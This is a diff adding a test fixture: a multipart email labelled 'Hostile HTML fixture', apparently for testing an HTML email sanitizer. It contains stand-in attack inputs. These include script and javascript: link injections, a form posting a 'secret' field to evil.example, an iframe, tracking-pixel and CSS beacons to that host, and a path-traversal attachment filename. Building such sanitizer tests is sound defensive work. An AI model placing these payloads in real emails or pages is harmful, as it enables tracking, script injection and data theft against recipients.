@@ -1,0 +1,46 @@
+Subject: Hostile HTML fixture
+From: Mallory <mallory@example.net>
+Content-Type: multipart/mixed; boundary="mix-fixture"
+
+--mix-fixture
+Content-Type: multipart/related; boundary="rel-fixture"
+
+--rel-fixture
+Content-Type: multipart/alternative; boundary="alt-fixture"
+
+--alt-fixture
+Content-Type: text/plain; charset=utf-8
+
+Safe plain fallback
+--alt-fixture
+Content-Type: text/html; charset=utf-8
+
+<html><body>
+<p onclick="steal()">Hello <strong>reader</strong></p>
+<script>alert(1)</script>
+<form action="https://evil.example/post"><input name="secret"></form>
+<iframe src="https://evil.example/frame"></iframe>
+<img src="https://evil.example/track.png">
+<img src="cid:chart@example.com">
+<img src="data:image/png;base64,AAAA">
+<style>body{background:url(https://evil.example/pixel)}</style>
+<a href="javascript:alert(1)">bad link</a>
+<a href="https://example.com/safe">safe link</a>
+<table><tr><td>cell
+</body></html>
+--alt-fixture--
+--rel-fixture
+Content-Type: image/png; name="chart.png"
+Content-Disposition: inline; filename="chart.png"
+Content-ID: <chart@example.com>
+Content-Transfer-Encoding: base64
+
+iVBORw0KGgo=
+--rel-fixture--
+--mix-fixture
+Content-Type: text/html; name="../../invoice?.html"
+Content-Disposition: attachment; filename="../../invoice?.html"
+Content-Transfer-Encoding: quoted-printable
+
+<script>alert(2)</script><p>download me</p>
+--mix-fixture--
